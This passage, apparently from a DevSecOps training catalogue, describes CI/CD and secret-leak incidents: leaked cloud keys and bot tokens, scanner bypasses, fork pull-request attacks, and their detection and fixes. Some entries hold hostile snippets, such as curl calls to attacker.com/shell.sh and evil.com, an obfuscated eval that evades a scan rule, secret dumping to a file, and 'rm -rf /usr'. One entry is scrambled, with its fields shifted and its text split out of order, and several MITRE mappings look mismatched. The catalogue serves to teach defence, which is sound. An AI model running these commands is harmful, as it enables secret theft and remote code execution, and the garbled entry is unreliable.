- **Attack Steps**: 1. A user creates a Colab notebook for a machine learning project.2. They authenticate to GCP using a downloaded JSON service account key.3. The notebook saves the key in plaintext in one of the code cells.4. The user shares the Colab notebook with a collaborator, but sets it to "Anyone with the link".5. A search engine indexes the link, making it publicly visible.6. An attacker discovers the notebook and uses the service key to access GCP resources.7. IAM logs show abnormal behavior like storage access and compute engine modifications.8. The org revokes the key and disables shared links by default in Colab.9. Users are retrained on secure key handling in notebooks.10. Runtime secrets are migrated to Google Secret Manager with scoped permissions.
- **Detection**: IAM logs + Colab activity
- **Solution**: Avoid storing secrets in code cells
- **Tags**: #gcpkey #notebookleak #mlsecurity

## Discord Bot Token Found in Public GitHub Repository

- **Attack Type**: Bot Credential Exposure
- **Target**: Discord
- **Vulnerability**: Bot token exposed in code
- **MITRE**: T1552.001
- **Impact**: Full takeover of communication bot
- **Tools**: GitHub, Discord API, curl
- **Scenario**: Discord bot token allowed attacker to take over and spam users
- **Attack Steps**: 1. A public GitHub repo contains a config.json file with the line "token": "NjUwMz...".2. This token is for a Discord bot with admin permissions on a large server.3. An attacker clones the repo and uses the token to authenticate via the Discord API.4. They send spam messages, ban users, and delete channels.5. The bot is removed by Discord Trust & Safety after abuse reports.6. The repo owner is notified, and the token is revoked.7. Going forward, Discord enables auto-revocation for leaked tokens.8. Devs switch to using environment variables and secrets management.9. GitHub adds bot token detection to its secret scanning rules.10. Policy is enforced to never store any bot token in config files.
- **Detection**: Discord API logs + abuse reports
- **Solution**: Use env vars for bot credentials
- **Tags**: #discordbot #tokenleak #spambot

## Travis CI Logs Contained AWS Credentials During Debug Mode

- **Attack Type**: CI Debug Mode Leak
- **Target**: Travis CI Logs
- **Vulnerability**: Debug mode exposed secrets
- **MITRE**: T1552.004
- **Impact**: Secret leak via public logs
- **Tools**: Travis CI, AWS CLI
- **Scenario**: Debug logs printed sensitive secrets into public CI job output
- **Attack Steps**: 1. During a CI job failure, a developer enables debug: true in .travis.yml to troubleshoot.2. The environment variable AWS_SECRET_ACCESS_KEY is printed as part of a script error.3. The entire CI log is stored on Travis’s public job URL.4. An attacker indexes Travis job logs via Google dorking and scrapes secrets.5. The key is used for a brief period to access S3 and EC2 instances.6. DevOps team is notified via AWS CloudTrail alerts.7. The credentials are revoked, and job history is deleted.8. Travis is updated to redact sensitive env variables in logs.9. Developers are trained to never use debug on public repos.10. Secret scanning tools are added to audit logs and Travis configs.
- **Detection**: Travis job logs, CloudTrail
- **Solution**: Disable debug logging in CI
- **Tags**: #travisci #logleak #debugdanger

## Bypassing Insecure SAST Rule in CI Pipeline

- **Attack Type**: SAST Rule Misconfiguration
- **Target**: CI Pipeline
- **Vulnerability**: Weak detection logic in SAST
- **MITRE**: T1203
- **Impact**: Introduction of RCE into production code
- **Tools**: GitHub Actions, Semgrep
- **Scenario**: Insecure regex in custom SAST rule allows attacker to bypass detection
- **Attack Steps**: 1. An attacker commits Python code with a dangerous eval(input()) statement.2. A SAST rule exists but is based on a naive regex match like eval\(.+\).3. The attacker obfuscates the call: getattr(__builtins__, 'eval')(input()).4. Semgrep misses it because the rule isn't built with AST understanding.5. The CI pipeline shows green and merges the code.6. The attacker later exploits this unsafe input at runtime.7. DevSecOps team realizes that improperly configured SAST rules can provide false assurance.8. A fix involves using Semgrep's deep mode with full AST scanning instead of regex.9. Team adds new test cases to validate detections.10. Secure coding standards are reinforced during PR reviews.
- **Detection**: Semgrep CI output
- **Solution**: Use AST-based detection, validate rules
- **Tags**: #sastbypass #regexfail #evalattack

## Tampering with GitHub Pull Request Scan Results

- **Attack Type**: Feedback Manipulation
- **Target**: GitHub PRs
- **Vulnerability**: Insecure PR comment rendering
- **MITRE**: T1557.003
- **Impact**: Vulnerability hidden during review
- **Tools**: GitHub Actions, Markdown, Semgrep
- **Scenario**: An attacker exploits GitHub Actions output parsing to hide real issues in PR comments
- **Attack Steps**: 1. A developer submits a pull request which triggers Semgrep to scan code.2. GitHub Action posts the output as a markdown comment in the PR.3. The attacker uses output injection—adds strings in code that, when parsed, collapse the comment block using <!-- --> markdown tags.4. Real vulnerabilities are pushed out of view inside the comment thread.5. Reviewers miss critical issues assuming the scan passed.6. The attacker merges PR with vulnerable code.7. Blue team detects issues post-deployment during runtime scan.8. The PR comment generation logic is patched to escape all code.9. Scan outputs are now uploaded as artifacts instead of PR comments.10. All past PRs are retroactively reviewed for scan injection attempts.
- **Detection**: GitHub Actions logs
- **Solution**: Sanitize and audit PR scan comments
- **Tags**: #scanbypass #markdowninjection #githubactions

## Exploiting Delayed Feedback in Security Scanner

- **Attack Type**: Feedback Loop Latency
- **Target**: CI/CD Pipelines
- **Vulnerability**: Feedback loop lag in CI scans
- **MITRE**: T1609
- **Impact**: Vulnerability merged before scanner flags it
- **Tools**: GitLab CI, Snyk, Node.js
- **Scenario**: Attacker exploits race between commit and scanner execution in slow CI/CD pipelines
- **Attack Steps**: 1. CI pipeline takes 10 minutes to run full SCA scans via Snyk.2. A developer submits a PR with a dependency on a known vulnerable NPM package.3. Before the SCA stage finishes, the PR is approved and merged manually.4. The scanner eventually flags the issue, but the code is already in main.5. The attacker exploits the vulnerable version in production before rollback.6. DevOps realizes their security feedback loop isn’t fast enough to block rapid merges.7. Pipeline is split to run fast SCA scans earlier in the process using caching.8. Merge gates are reconfigured to enforce scan pass before any merge.9. Developers are trained not to manually override security stage gates.10. GitLab now enforces a required job for Snyk before merge can proceed.
- **Detection**: Merge audit logs, Snyk dashboard
- **Solution**: Gate merges until security stages pass
- **Tags**: #feedbackdelay #cicdrace #snyklag

## Bypassing Checkov in IaC by Using Obscure Terraform Modules

- **Attack Type**: IaC Evasion
- **Target**: Terraform + IaC
- **Vulnerability**: Checkov default skips external modules
- **MITRE**: T1570
- **Impact**: Misconfig deployed via unscanned IaC
- **Tools**: Terraform, Checkov
- **Scenario**: Checkov fails to scan nested modules fetched from third-party Git repos
- **Attack Steps**: 1. A developer writes Terraform code using a module hosted on an external Git repo: source = "git::https://github.com/example/insecure-module".2. The module contains insecure configurations (e.g., open security groups).3. Checkov is configured to scan only local files and doesn’t follow external sources.4. The insecure module is never scanned, but the code is deployed.5. The misconfiguration leads to public exposure of a cloud VM.6. After post-incident review, the team configures Checkov with --download-external-modules true.7. Registry-based modules are verified manually during PR reviews.8. CI pipeline is updated to cache and scan all module dependencies.9. Developers are restricted from using unknown external sources.10. All IaC now uses reviewed modules from a private registry.
- **Detection**: Checkov logs, cloud alerts
- **Solution**: Enable external module scan flag
- **Tags**: #iacscan #checkovbypass #terraformmodules

## Misuse of Suppression Tags to Hide Critical Issues

- **Attack Type**: Policy Evasion
- **Target**: CI Scanning Tools
- **Vulnerability**: Abuse of suppression annotations
- **MITRE**: T1562.001
- **Impact**: Critical flaw pushed by silencing alert
- **Tools**: Python, Semgrep, Snyk
- **Scenario**: Developer misuses #nosem or snyk:ignore tags to suppress high-severity flaws
- **Attack Steps**: 1. A security scan on a PR flags hardcoded secrets and SSRF-prone HTTP calls.2. Developer adds #nosem and #snyk:ignore above the lines, claiming false positives.3. Reviewer doesn’t inspect closely and merges the PR.4. In production, the vulnerable API is exploited via SSRF.5. DevSecOps team audits scan suppressions across history.6. They discover multiple suppressions were used incorrectly.7. Semgrep is reconfigured to alert on overuse of suppression comments.8. All suppressions now require justification via PR template fields.9. PRs with critical suppressions are routed for security review.10. Developer training includes proper use of suppressions.
- **Detection**: Audit scan suppression usage
- **Solution**: Enforce suppression policy with review
- **Tags**: #semgrep #suppressionabuse #securitygate

## Visual Threat Modeling Missed External Inputs to Build Jobs

- **Attack Type**: Threat Modeling Blindspot
- **Target**: DevSecOps Diagrams
- **Vulnerability**: Static threat model missed dynamic inputs
- **MITRE**: T1583.003
- **Impact**: RCE via PR from untrusted source
- **Tools**: ThreatSpec, Draw.io, GitHub Actions
- **Scenario**: Static threat model diagrams missed dynamic build inputs from PRs
- **Attack Steps**: 1. The DevSecOps team creates a threat model showing CI flow from commit → build → deploy.2. Threat modeling assumes trusted code only, missing the fact that PRs from forks are automatically built.3. An attacker submits a PR that includes a malicious echo "curl evil.com" >> build.sh" command.4. Because the CI pipeline doesn’t differentiate forked PRs, it executes blindly.5. The attack succeeds, proving the threat model had missed key trust boundaries.6. Model is updated to include dynamic data paths from forks, branches, and GitHub Events.7. Controls are added to sandbox PR builds and limit runner permissions.8. CI pipeline is split into untrusted vs trusted stages.9. Team uses automated threat modeling tools like ThreatSpec.10. A continuous review loop is built into the threat model itself.
- **Detection**: GitHub Actions audit logs
- **Solution**: Model dynamic inputs, sandbox PRs
- **Tags**: #threatmodeling #prtrust #devsecops

## Exploiting Overly Permissive Merge Conditions in Security Gates

- **Attack Type**: CI Policy Misconfiguration
- **Target**: CI Config Files
- **Vulnerability**: Logical error in security gate logic
- **MITRE**: T1565.001
- **Impact**: Vulnerable code merged due to logic bug
- **Tools**: GitHub Actions, Snyk, Checkov
- **Scenario**: CI/CD pipeline lets developers merge code if 1 of 3 scanners pass instead of all
- **Attack Steps**: 1. Pipeline runs Semgrep, Snyk, and Checkov in parallel.2. CI config mistakenly uses needs.any instead of needs.all logic.3. If any one scanner passes, the merge gate is considered successful.4. A developer introduces a dependency with a critical CVE.5. Snyk flags it, but Semgrep and Checkov pass.6. Because of any logic, the code is merged.7. Exploitation happens via the vulnerable lib in production.8. Security team audits CI config and finds the logic error.9. The pipeline is rewritten with strict gating: all scanners must pass.10. An alerting system is added to detect incomplete scanner execution.
- **Detection**: CI job results vs PR logs
- **Solution**: Require all scans to pass before merge
- **Tags**: #mergegate #cicdlogic #securitychecks

## Pipeline Runs as Root Leads to System File Corruption

- **Attack Type**: Runner Misconfiguration
- **Target**: Docker Runners
- **Vulnerability**: Excessive privileges in CI containers
- **MITRE**: T1201
- **Impact**: CI instability + risk of full compromise
- **Tools**: Docker, GitHub Actions
- **Scenario**: Build job runs containers with USER root, enabling unintended system file changes
- **Attack Steps**: 1. A CI job spins up a Docker container with USER root for build purposes.2. The build step uses RUN cp /secrets.txt /build/secrets.3. A developer accidentally includes a rm -rf /usr command in a test script.4. Because the container runs as root, the command deletes critical system files.5. The container crashes mid-build, disrupting the CI process.6. Investigation shows that many runners have excessive privileges.7. Runners are rebuilt to run with non-root users and immutable file systems.8. Dockerfile best practices are enforced via linters.9. CI templates are locked so devs can't override the base image configs.10. Runtime security tools are added to detect privilege misuse in pipelines.
- **Detection**: Container logs, Docker audit tools
- **Solution**: Never run CI containers as root
- **Tags**: #rootuser #dockerbuild #cicdsecurity

## No Feedback for IaC Linting Caused Widespread Cloud Misconfig

- **Attack Type**: Feedback Loop Gap
- **Target**: IaC PR Reviews
- **Vulnerability**: Scan output not surfaced to devs
- **MITRE**: T1609
- **Impact**: Cloud misconfig due to silent scan
- **Tools**: Checkov, Terraform Cloud
- **Scenario**: IaC security checks were run but not reported back to developers
- **Attack Steps**: 1. Terraform code is scanned using Checkov during CI builds.2. Misconfigured S3 bucket permissions and insecure IAM roles are flagged.3. However, the scan results are only stored in logs, not surfaced in PR or email.4. Developers assume all checks passed and merge the PR.5. The infra is deployed with open internet access to sensitive data.6. Later, a bug bounty hunter finds the exposed bucket.7. DevSecOps updates pipeline to fail the job and comment on PRs with Checkov output.8. Email alerts and Slack notifications are added.9. Visibility dashboards are created for security scan results across repos.10. PR templates include checklist for reviewing scan outputs before merge.
- **Detection**: CI logs, repo monitoring
- **Solution**: Fail pipeline and send feedback clearly
- **Tags**: #feedbackloop #iacfail #cloudexposure

## Using Threat Modeling to Prevent Privilege Escalation via Self-Hosted Runners

- **Attack Type**: Runner Threat Mapping
- **Target**: Self-Hosted Runners
- **Vulnerability**: Lack of segmentation from runners to internal infra
- **MITRE**: T1210
- **Impact**: Full internal compromise from CI job
- **Tools**: Microsoft Threat Modeling Tool, GitHub
- **Scenario**: Threat model detects risk of access from CI runner into internal prod network
- **Attack Steps**: 1. DevSecOps team performs threat modeling of CI pipeline which uses self-hosted runners inside the internal network.2. They realize attackers can compromise the CI job and pivot into the network.3. Scenarios include runners with no network segmentation and unrestricted firewall access.4. The team simulates RCE via malicious PR leading to lateral movement.5. Threat model helps prioritize segmentation between runner and prod environment.6. Firewall rules are hardened.7. CI runners are rebuilt to operate in isolated containers.8. The threat model is updated regularly based on pipeline architecture changes.9. Access to sensitive internal endpoints is denied by default.10. DevSecOps adopts a “runner trust boundary” concept in future models.
- **Detection**: Threat model, EDR logs
- **Solution**: Segregate runners from internal systems
- **Tags**: #threatmodel #runnerabuse #ciaccess

## Delayed Static Scan Results Allow Production Vulnerabilities

- **Attack Type**: Static Scan Timing Flaw
- **Target**: GitHub + Static Scanners
- **Vulnerability**: Security stage too late in pipeline
- **MITRE**: T1609
- **Impact**: Vulnerable code pushed to production
- **Tools**: GitHub Actions, SonarQube
- **Scenario**: Static code analysis in CI/CD returns findings only after deployment due to pipeline design flaw
- **Attack Steps**: 1. A developer pushes code with a hardcoded admin token in config.py.2. GitHub Actions triggers multiple build steps, ending with SonarQube scanning.3. Due to long dependency installation and test stages, SonarQube runs at the very end.4. The merge gate doesn't block merging based on scan status; PR gets merged quickly before scanner finishes.5. The admin token is now in production and publicly visible in logs.6. DevSecOps only notices the issue when SonarQube raises a post-deployment alert.7. Incident triage begins, but the attacker already used the token.8. Teams update CI design to shift SAST stage before all other jobs.9. Merge gate is reconfigured to enforce waiting on all security jobs.10. Team introduces Slack alerts for high-severity static scan outputs.
- **Detection**: PR logs, SonarQube
- **Solution**: Move SAST earlier; enforce scan gate
- **Tags**: #sastdelay #tokenleak #cioptimization

## Developer Skips Pre-Commit Hooks with Manual Git Flags

- **Attack Type**: Git Pre-Commit Bypass
- **Target**: Dev Workstations
- **Vulnerability**: Manual override of hook verification
- **MITRE**: T1557
- **Impact**: Secret exposure via developer override
- **Tools**: Git, Husky, TruffleHog
- **Scenario**: Developer bypasses secret scanning and linting pre-commit hooks with Git flags
- **Attack Steps**: 1. Security team enforces pre-commit hooks to scan secrets via TruffleHog and enforce code style.2. Developer is rushing and bypasses the hook using git commit --no-verify.3. Hardcoded API key is committed and pushed.4. GitHub Actions scanner later detects the exposed key, but it's already picked up by malicious scanners monitoring public repos.5. Key is used to exfiltrate internal test data.6. Security team conducts Git history cleanup, rotates key, and does impact analysis.7. Developer is educated on hook purpose and dangers of bypassing.8. Team updates CI to add server-side enforcement via GitHub pre-receive hooks.9. Commit policies are hardened to reject commits with secrets.10. TruffleHog is also run on the CI pipeline as a backup to local hooks.
- **Detection**: Git logs, TruffleHog CI
- **Solution**: Enforce server-side scanning
- **Tags**: #gitbypass #precommit #secretleak

## Pipeline Allows External PR to Access Secrets via Logs

- **Attack Type**: Secret Leakage via Logs
- **Target**: Open Source Pipelines
- **Vulnerability**: Unmasked secrets in log output
- **MITRE**: T1552.001
- **Impact**: Public secret leakage via CI logs
- **Tools**: GitHub Actions, AWS CLI
- **Scenario**: External contributor's PR triggers pipeline that prints secrets in logs due to verbose debugging
- **Attack Steps**: 1. An external developer opens a PR in an open-source repo.2. The pipeline is configured to automatically run on PRs using self-hosted runners.3. During the CI run, a build step executes aws configure list with verbose mode, printing the AWS_SECRET_ACCESS_KEY in the logs.4. GitHub's log viewer makes this data public to all users, including the PR creator.5. The exposed secret is quickly used to access private S3 buckets and steal config data.6. The token is revoked, and all logs scrubbed.7. DevSecOps introduces PR context filtering to separate trusted from untrusted sources.8. Secrets are masked in logs using GitHub Actions secrets redaction features.9. PR-based runs are sandboxed in isolated runners.10. Logs from external contributions are quarantined and reviewed before public release.
- **Detection**: GitHub Logs, AWS CloudTrail
- **Solution**: Sanitize logs, separate PR trust zones
- **Tags**: #logleak #cisecrets #awsaccess

## Pipeline Trusts Code From Forked Repos Without Validation

- **Attack Type**: Untrusted PR Code Execution
- **Target**: bashline.<br>3. PR is opened, and GitHub Actions executes the workflow automatically.<br>4. Sincepull_request_targetis used in the workflow, the job has access to project secrets.<br>5. The attack script is run inside the GitHub-hosted runner and leaks all tokens to the attacker.<br>6. Organization disables workflows temporarily and revokes credentials.<br>7. The root cause is misuse ofpull_request_target` which trusts the PR’s code.8. CI workflow is redesigned to not expose any secrets on PRs from forks.9. Jobs only use read-only tokens and isolate forked builds from main secrets.10. Security reviews are now mandatory on CI config PRs.
- **Vulnerability**: Forked CI PRs
- **MITRE**: Trust boundary violation in workflows
- **Impact**: T1606
- **Tools**: GitHub Actions, Docker
- **Scenario**: CI/CD runs code from forks without validating origin or sandboxing
- **Attack Steps**: 1. A contributor forks an open-source project.2. They modify the CI workflow YAML to include a `run: curl attacker.com/shell.sh
- **Detection**: Full token exfiltration via fork PR
- **Solution**: GitHub PR Logs
- **Tags**: Don’t expose secrets to forked workflows

## Insecure Custom Scan Rule Ignores Known Malware Signatures

- **Attack Type**: Incomplete Custom Rule
- **Target**: CI Workflows
- **Vulnerability**: Incomplete detection coverage
- **MITRE**: T1204
- **Impact**: Stealth malware merged into pipeline
- **Tools**: Snyk, Semgrep
- **Scenario**: Security team creates custom scan rule that fails to catch malware-laden scripts
- **Attack Steps**: 1. A developer adds a base64-encoded reverse shell in a shell script inside the repo.2. The company has disabled default scanning rules and uses custom ruleset for performance reasons.3. The rules look only for cleartext nc, bash, or curl keywords.4. Encoded content bypasses detection.5. Script is merged and later executed via Jenkins pipeline.6. Attacker gets reverse shell access to CI runner.7. Security team realizes that base64 payloads weren’t considered.8. They enable deep decoding and entropy checks on scripts in future scans.9. The pipeline adds a malware signature database to detect known obfuscated payloads.10. Incident response procedures are defined to scan all shell script histories.
- **Detection**: Shell audit logs, SCA scan
- **Solution**: Use layered scanning (rules + signatures)
- **Tags**: #semgrepbypass #malware #base64

## Threat Modeling Misses GitHub Environment Secrets Risk

- **Attack Type**: Environment Secret Misuse
- **Target**: GitHub Actions
- **Vulnerability**: Insecure cross-branch secret sharing
- **MITRE**: T1552
- **Impact**: Credential theft from CI secrets
- **Tools**: GitHub Actions, ThreatSpec
- **Scenario**: Secrets stored in GitHub Environments are reused across branches and PRs
- **Attack Steps**: 1. GitHub Actions uses secrets.GITHUB_ENV for multiple workflows.2. A threat model assumes all jobs are trusted and do not expose env variables.3. A malicious actor opens a PR and introduces a run: echo $SECRET > file.txt statement.4. The job is triggered using pull_request_target and environment secrets are accessible.5. File is uploaded as CI artifact and downloaded from job logs.6. The attacker gains sensitive creds (e.g., Slack webhook token).7. DevSecOps updates threat model to consider environment-based secrets as high-risk.8. GitHub environment secrets are replaced with context-limited secrets.9. Separate environments are created per branch.10. Artifact uploads are disabled for forked PRs.
- **Detection**: Job logs, CI artifacts
- **Solution**: Limit environment secrets per branch
- **Tags**: #githubenv #ciabuse #prsecrets

## Lack of Scanner Baselines Results in Too Many False Positives

- **Attack Type**: Feedback Fatigue
- **Target**: SAST Pipelines
- **Vulnerability**: No triage of scanner results
- **MITRE**: T1570
- **Impact**: Real bugs missed in alert noise
- **Tools**: Semgrep, SonarQube
- **Scenario**: Developers ignore SAST results due to noisy and unreviewed scan outputs
- **Attack Steps**: 1. Scanners are introduced in pipeline with default rule sets.2. Large legacy codebases result in thousands of alerts per build.3. Developers stop reviewing CI failures because 90% are false positives or low severity.4. A real RCE risk in a Django template injection gets buried in noise.5. The app is breached in production and SSRF is discovered.6. DevSecOps team triages alerts and implements a baseline suppression list.7. Scanners are re-tuned to suppress known safe patterns and highlight deltas only.8. Daily delta dashboards show only newly introduced issues.9. Devs regain confidence in scan alerts and begin fixing valid issues.10. Review cadence improves and noise drops by 85%.
- **Detection**: Scan dashboards, alert history
- **Solution**: Use alert baselining + deltas only
- **Tags**: #sastnoise #feedbackloop #triage

## Misconfigured SCA Tool Allows Merging Known CVEs

- **Attack Type**: SCA Policy Flaw
- **Target**: NPM Projects
- **Vulnerability**: Incomplete SCA scan depth
- **MITRE**: T1190
- **Impact**: Known CVE passed undetected
- **Tools**: Snyk, NPM, GitLab CI
- **Scenario**: Snyk scan only checks for direct dependencies, ignores vulnerable transitive ones
- **Attack Steps**: 1. A developer adds a trusted package express@4.17.1.2. However, this version depends on qs@6.2.2, which is vulnerable to prototype pollution.3. Snyk scan is misconfigured to only flag direct CVEs, not deep dependency chains.4. The PR is approved and merged as no warnings are shown.5. Prototype pollution is exploited later to execute malicious JS payload.6. Snyk is reconfigured to enable transitive dependency scanning.7. SCA report now blocks PRs with any vulnerable packages regardless of depth.8. Dependency upgrade guidelines are introduced.9. The pipeline includes lockfile diffs and dependency graphs.10. Dev teams are trained on identifying vulnerable trees.
- **Detection**: Snyk logs, CVE DB
- **Solution**: Enable transitive scan + graph analysis
- **Tags**: #sca #cvedetection #npmsec

## Allowing Unverified Plugins in CI Pipeline Introduces RCE Risk

- **Attack Type**: Plugin Supply Chain
- **Target**: CI Integrations
- **Vulnerability**: Third-party plugin tampering
- **MITRE**: T1195
- **Impact**: Persistent backdoor in CI jobs
- **Tools**: Jenkins, GitHub Marketplace
- **Scenario**: Jenkins or GitHub Actions installs unverified third-party plugin that runs arbitrary code
- **Attack Steps**: 1. A developer installs a plugin from GitHub Marketplace to lint YAML files.2. Plugin is from unknown author and lacks security review.3. It includes obfuscated code that sends job metadata to attacker’s server.4. Since CI runners have repo write access, attacker triggers file uploads.5. The backdoor remains hidden for weeks due to no plugin audit policy.6. DevSecOps team implements a plugin approval workflow.7. Marketplace plugins are checked for verified authorship.8. CI runs in sandbox mode for unverified plugins.9. Security tests run after every plugin install or update.10. A plugin manifest is tracked and reviewed weekly.
- **Detection**: Job traffic logs
- **Solution**: Audit & approve all CI plugins
- **Tags**: #pluginrisk #ciabuse #marketplace

## SAST Tool Only Scans Modified Files, Not Whole Codebase

- **Attack Type**: Partial Coverage
- **Target**: PR Scanning
- **Vulnerability**: Diff-only scans ignore dependencies
- **MITRE**: T1203
- **Impact**: RCE via legacy untouched code
- **Tools**: Semgrep, GitHub CI
- **Scenario**: SAST configured to scan only diffs in PRs; attacker exploits untouched legacy code
- **Attack Steps**: 1. To reduce scan time, DevSecOps enables --diff-only mode in Semgrep.2. Only files changed in PRs are scanned.3. Attacker adds a function in a new file that calls vulnerable legacy code in another untouched file.4. Since the vulnerable function wasn’t modified, Semgrep doesn’t scan or flag it.5. The new code is merged and enables RCE in production.6. DevSecOps modifies policy: full scans for high-sensitivity repos.7. Teams whitelist certain directories for full-code coverage.8. Long-term plan includes differential scanning only for low-risk modules.9. Scan time is optimized using Semgrep Cloud Platform.10. Legacy code is back-scanned and triaged for known risks.
- **Detection**: PR scan settings
- **Solution**: Full-scope scans in sensitive repos
- **Tags**: #sastscope #diffonly #semgrep

## Pipeline Skips IaC Scan for CloudFormation Stack with Misconfigured S3 Bucket

- **Attack Type**: IaC Scan Bypass
- **Target**: IaC Repositories
- **Vulnerability**: Conditional stage bypass in CI
- **MITRE**: T1530
- **Impact**: Sensitive data exposed publicly
- **Tools**: GitHub Actions, Checkov, AWS CLI
- **Scenario**: Dev pushes insecure CloudFormation template, pipeline skips IaC stage, S3 bucket is left publicly readable
- **Attack Steps**: 1. A developer commits a CloudFormation template creating an S3 bucket.2. Due to recent CI refactoring, the checkov stage is conditionally skipped on certain folders.3. The IaC scanning condition excludes nested directories like infra/aws/legacy/.4. This template has AccessControl: PublicRead, making the bucket world-readable.5. The template is deployed as-is without triggering a Checkov scan.6. Attackers scan AWS IP space and find the open S3 bucket.7. Sensitive internal reports are downloaded from the bucket.8. DevSecOps adds directory-wide IaC scan policies across all folders.9. Merge gates are configured to fail PRs if IaC stage is skipped.10. S3 bucket policy alerts are now monitored via AWS Config and GuardDuty.
- **Detection**: AWS Config, GuardDuty
- **Solution**: Always scan all infrastructure directories
- **Tags**: #iacscan #s3exposure #cloudformation

## PR Merge Allowed Without Threat Model Approval

- **Attack Type**: Missing Threat Review
- **Target**: GitHub CI
- **Vulnerability**: CI design changes without risk analysis
- **MITRE**: T1600
- **Impact**: Credential leakage from mismodeled pipeline
- **Tools**: GitHub PR, ThreatSpec, LucidChart
- **Scenario**: Teams push major CI refactor (new runners, secrets) without modeling or security review
- **Attack Steps**: 1. A DevOps engineer modifies .github/workflows/main.yml to add new GitHub-hosted runners and store environment variables.2. Secrets like DockerHub tokens are now injected into CI jobs directly.3. This PR is merged by a senior engineer without any threat model approval or security review.4. The threat model didn't include runners hosted on GitHub’s shared infra.5. Within days, secrets from a failed job are found in public logs.6. Red Team later simulates an attacker abusing leaked credentials to access private container registry.7. DevSecOps enforces a mandatory threat modeling checklist for workflow file changes.8. PR templates now include threat boundary fields and trust analysis.9. Every workflow change goes through a security peer review.10. Reviewers use ThreatSpec to visualize updated threat maps before approval.
- **Detection**: GitHub logs, audit PR history
- **Solution**: Mandatory threat model reviews per CI change
- **Tags**: #ciworkflow #threatmodel #peerreview

## Feedback Loop Broken Due to Disabled Notifications in CI Failures

- **Attack Type**: Notification Failure
- **Target**: Developer Feedback Channels
- **Vulnerability**: Alerting mechanism broken
- **MITRE**: T1562
- **Impact**: Critical bugs reach production unnoticed
- **Tools**: GitHub Actions, Slack, Semgrep
- **Scenario**: Developers don’t fix SAST issues because alerts don’t reach them
- **Attack Steps**: 1. GitHub Actions run Semgrep during pull requests, producing JSON results with findings.2. The integration with Slack via webhook broke two weeks ago after Slack app token expired.3. Developers keep pushing new commits with unresolved critical issues.4. Security assumes feedback loop is working, but no one is notified.5. A dangerous deserialization bug remains unfixed and hits production.6. Incident postmortem identifies broken alert delivery and zero visibility.7. DevSecOps sets up heartbeat alerts on webhook integrations.8. GitHub status checks are enforced on scan outputs, blocking PRs until fixed.9. Notifications are now redundant—Slack + Email + PR comment.10. Weekly reports are sent listing scan alerts per developer/team.
- **Detection**: PR status, Slack webhook logs
- **Solution**: Multi-channel alerting and webhook health checks
- **Tags**: #cifeedback #alerting #devsecopsloop

## Open Redirect Found Due to Lack of Threat Modeling on URL Handling Code

- **Attack Type**: URL Input Abuse
- **Target**: Web App Logic
- **Vulnerability**: No validation of redirect inputs
- **MITRE**: T1071.001
- **Impact**: Open redirect leads to phishing abuse
- **Tools**: GitHub CI, Burp Suite, ThreatSpec
- **Scenario**: New redirect feature passes URL from user input without validation; missed in threat model
- **Attack Steps**: 1. A frontend developer adds a new feature in React app: redirectTo=....2. Backend (Node.js) accepts the URL without validation and redirects using res.redirect(req.query.redirectTo).3. The app is deployed after passing SAST and test stages.4. No threat modeling was done to catch unvalidated redirects.5. An attacker crafts a phishing link that abuses the open redirect to mask malicious domains.6. Phishing campaigns trick users using this vulnerability.7. DevSecOps holds a postmortem and updates threat modeling guidelines to include user-controlled URL handling.8. Static scanning rule for open redirects is added to Semgrep.9. CI includes a mandatory review checklist item for redirect logic.10. Backend now whitelists internal domains only.
- **Detection**: Burp Suite, PR review
- **Solution**: Whitelist redirects; model input flows
- **Tags**: #openredirect #threatgap #redirectabuse

## Legacy Code Scans Skipped for Performance, Allowing XSS in Old Files

- **Attack Type**: XSS in Legacy
- **Target**: Legacy Codebases
- **Vulnerability**: Risky files excluded from scans
- **MITRE**: T1059.007
- **Impact**: XSS in unscanned legacy code
- **Tools**: GitHub CI, SonarQube, Chrome DevTools
- **Scenario**: Security scanners exclude untouched legacy frontend files; XSS goes undetected
- **Attack Steps**: 1. To improve CI runtime, only changed files are scanned by SonarQube.2. An attacker exploits a known reflected XSS in legacy.html, untouched for 3 years.3. A newly added API exposes a parameter that’s reflected into this old file.4. Since this file wasn’t modified in the PR, no scan was performed.5. Attacker injects <script> payload and bypasses cookie auth via session hijack.6. Blue team only detects XSS from user reports.7. DevSecOps updates scanning policy to include full scans weekly.8. High-risk files are marked with #legacy-critical tag to force full scanning.9. Baseline diffs are tracked to compare new vs old.10. CI includes alert for use of unescaped user inputs.
- **Detection**: Browser testing, incident reports
- **Solution**: Scan full app on schedule, not just diffs
- **Tags**: #legacyxss #sonarqubebypass #cioptimize

## CI/CD Does Not Enforce SCA License Violations

- **Attack Type**: License Compliance Failure
- **Target**: Open Source Components
- **Vulnerability**: License policy not enforced in pipeline
- **MITRE**: T1608
- **Impact**: Legal and operational risk due to GPL use
- **Tools**: FOSSA, GitHub Actions, Snyk
- **Scenario**: SCA tool flags GPL license violation, but CI doesn’t block merge
- **Attack Steps**: 1. A developer adds a third-party library under GPL license.2. The org policy forbids use of GPL due to redistribution obligations.3. The pipeline includes SCA via FOSSA, but license policy is not linked to merge status.4. The merge is allowed despite violations.5. Days later, the code is deployed and publicly distributed.6. Legal risk arises due to license breach.7. DevSecOps integrates license violation policy into CI gates.8. Merge is now blocked on license type mismatch.9. Developers get license type alerts directly in PR comments.10. Training session conducted on OSS license risks.
- **Detection**: FOSSA Dashboard
- **Solution**: Enforce license policies as blocking checks
- **Tags**: #licensecompliance #sca #ossrisk

## Devs Use Copy-Paste Code With Known Vulnerability, Skipping Scanner Triggers

- **Attack Type**: Code Snippet Injection
- **Target**: Pasted Code
- **Vulnerability**: Modified snippets bypassing detection
- **MITRE**: T1203
- **Impact**: RCE via insecure helper function
- **Tools**: GitHub Actions, Semgrep, StackOverflow
- **Scenario**: Insecure code snippet pasted from StackOverflow not detected due to altered formatting
- **Attack Steps**: 1. A developer copies a base64-decoding function from StackOverflow.2. The function uses eval(Buffer.from(...)), vulnerable to code injection.3. Due to formatting and comment changes, Semgrep rules fail to detect the snippet.4. Code is merged and results in potential RCE in internal APIs.5. Scanner relies on pattern match and misses slightly modified versions.6. DevSecOps tunes Semgrep to support AST-based detection.7. Added NLP-based snippet scanning to catch semantically similar vulnerabilities.8. Weekly developer newsletter warns against insecure copy-paste practices.9. A code snippet analyzer is added to pre-commit checks.10. Documentation includes secure alternatives for common helper functions.
- **Detection**: Code reviews, API logs
- **Solution**: Use semantic matching in scanners
- **Tags**: #snippetabuse #eval #scannerbypass

## SCA Report Overlooked Due to Output Format Misunderstanding

- **Attack Type**: UI Confusion
- **Target**: SCA Reporting
